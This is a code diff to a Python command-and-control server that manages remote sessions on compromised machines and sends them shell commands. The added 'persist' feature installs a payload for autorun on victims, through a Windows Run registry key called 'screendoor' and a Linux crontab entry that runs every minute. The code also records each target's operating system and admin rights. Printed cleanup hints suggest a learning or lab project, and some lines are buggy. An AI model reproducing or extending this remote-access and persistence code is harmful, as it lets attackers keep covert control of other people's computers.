@@ -38,7 +38,7 @@ def banner():
     print(bcolors.HEADER + '=============================================\n' + bcolors.ENDC)
 
 def comm_in(target_id):
-    """Handles all responses sent from a sockclient.
+    """ Handles all responses sent from a sockclient.
 
     Args:
         target_id (int): _description_
@@ -51,7 +51,7 @@ def comm_in(target_id):
     return response
 
 def comm_out(target_id, message):
-    """Sends commands from the sockserver to a sockclient.
+    """ Sends commands from the sockserver to a sockclient.
 
     Args:
         target_id (int): _description_
@@ -60,19 +60,40 @@ def comm_out(target_id, message):
     message = str(message)
     target_id.send(message.encode())
 
-def target_comm(target_id):
-    """
-    Manages the command and traffic control.
+def target_comm(target_id, targets, num):
+    """ Manages the command and traffic control.
+
+    Args:
+        target_id (int): _description_
     """
     while True:
         message = input('[*] Message to send > ')
         comm_out(target_id, message)
+
         if message == 'exit':
             target_id.send(message.encode())
             target_id.close()
+            targets[num][7] = bcolors.FAIL + 'Dead' + bcolors.ENDC
             break
         if message == 'background':
             break
+        if message == 'help':
+            pass
+        if message == 'persist':
+            payload_name = input('[+]' + bcolors.BOLD + 'Enter the name of the payload to add to autorun: ' + bcolors.ENDC)
+
+            if targets[num][6] == 1:
+                persist_cmd_1 = f'cmd.exe /c copy {payload_name} C:\\Users\Public'
+                target_id.send(persist_cmd_1.encode())
+                persist_cmd_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
+                target_id.send(persist_cmd_2)
+                print(bcolors.WARNING + '[!] Run this command to clean up the registry:' + bcolors.BOLD + '\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f' + bcolors.ENDC)
+
+            if targets[num][6] == 2:
+                persist_cmd_3 = f'echo "*/1 * * * * python3 /home/{targets[num][3]/payload_name}" | crontab -'
+                target_id.send(persist_cmd_3)
+                print(bcolors.WARNING + '[+] Run this command to clean up the crontab: ' + bcolors.BOLD + '\n crontab -r')
+            print(bcolors.OKGREEN + '[+] Persistence technique completed.' + bcolors.ENDC)
 
         else:
             response = comm_in(target_id)
@@ -99,7 +120,7 @@ def comm_handler():
         receiving it where needed.
     """
     while True:
-        # ! WHY IS THIS NOT WORKING?
+        # ! WHY IS THIS NOT WORKING ON LINUX?
         if kill_flag == 1:
             print('OHHHH NOOOOO')
             break
@@ -112,6 +133,9 @@ def comm_handler():
 
             # check if current target is an admin account
             admin = remote_target.recv(BUFFER).decode()
+
+            op_sys = remote_target.recv(BUFFER).decode()
+
             if admin == 1:
                 # if target is Windows (UID = 1)
                 is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
@@ -123,6 +147,8 @@ def comm_handler():
                 else:
                     is_admin = bcolors.FAIL + 'No' + bcolors.ENDC
 
+            payload_val = 1 if 'Windows' in op_sys else 2
+
             # get the time when the target client connects
             curr_time = time.strftime("%H:%M:%S", time.localtime())
             curr_date = datetime.now()
@@ -131,10 +157,10 @@ def comm_handler():
             # get the host name of the target client
             host_name = socket.gethostbyaddr(remote_ip[0])
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", datetime_record, username, is_admin])
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", datetime_record, username, is_admin, op_sys, payload_val, bcolors.OKGREEN + 'Active' + bcolors.ENDC])
                 print(bcolors.OKGREEN + f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')
             else:
-                targets.append([remote_target, remote_ip[0], datetime_record])
+                targets.append([remote_target, remote_ip[0], datetime_record, username, is_admin, op_sys, payload_val, 'Active'])
                 print(bcolors.OKGREEN + f'\n[+] Connection received from {remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')
         except:
             pass
@@ -286,26 +312,58 @@ if __name__ == '__main__':
                         bcolors.BOLD + 'Username' + bcolors.ENDC,
                         bcolors.BOLD + 'Admin' + bcolors.ENDC,
                         bcolors.BOLD + 'Target' + bcolors.ENDC,
+                        bcolors.BOLD + 'Operating System' + bcolors.ENDC,
                         bcolors.BOLD + 'Connection Time' + bcolors.ENDC
                     ]
 
                     sessions_table.padding_width = 3
 
                     for target in targets:
-                        sessions_table.add_row([session_counter, 'placeholder', target[3], target[4], target[1], target[2]])
+                        status = target[7]
+                        username = target[3]
+                        admin = target[4]
+                        host = target[1]
+                        host_os = target[5]
+                        connection_time = target[2]
+
+                        sessions_table.add_row([session_counter, status, username, admin, host, host_os, connection_time])
                         session_counter += 1
                     print(sessions_table)
                     print("")
 
                 # interact with individual sessions
                 if command.split(" ")[1] == '-i':
-                    num = int(command.split(" ")[2])
-                    target_id = (targets[num])[0]
-                    target_comm(target_id)
+                    try:
+                        num = int(command.split(" ")[2])
+                        target_id = (targets[num])[0]
+                        if (targets[num])[7] == 'Active':
+                            target_comm(target_id, targets, num)
+                        else:
+                            print(
+                                bcolors.WARNING + '[-] ' +
+                                bcolors.BOLD +
+                                'WARNING: ' +
+                                bcolors.ENDC +
+                                bcolors.WARNING +
+                                'You cannot interact with a dead session'
+                            )
+                    except IndexError:
+                        print(bcolors.FAIL + f'[-] Session {num} does not exist.' + bcolors.ENDC)
 
         except KeyboardInterrupt:
-            print(bcolors.WARNING + '\n[+] Keyboard interrupt issued.' + bcolors.ENDC)
-            kill_flag = 1
-            sock.close()
-            break
+            quit_message = input(bcolors.WARNING + '\n[+] Are you sure you want to quit? (y/n) ' + bcolors.ENDC)
+
+            if quit_message == 'y':
+                len_targets = len(targets)
+                for target in targets:
+                    if target[7] == 'Dead':
+                        pass
+                    else:
+                        comm_out(target[0], 'exit')
+                kill_flag = 1
+                if listener_counter > 0:
+                    sock.close()
+                break
+            else:
+                continue
 
